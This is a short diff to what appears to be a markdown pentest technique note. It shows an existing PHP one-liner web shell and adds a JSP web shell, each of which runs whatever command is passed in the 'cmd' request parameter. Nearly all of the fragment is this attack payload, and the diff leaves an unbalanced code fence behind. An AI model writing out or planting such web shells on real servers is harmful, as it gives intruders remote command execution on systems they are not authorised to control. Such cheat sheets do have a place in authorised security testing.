@@ -26,9 +26,12 @@ tags: [technique, other]
 <?php system($_REQUEST["cmd"]); ?>
 ```
 
+#### FOR `jsp`
+```
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
-```
+
 
 ## Things to know
 - 
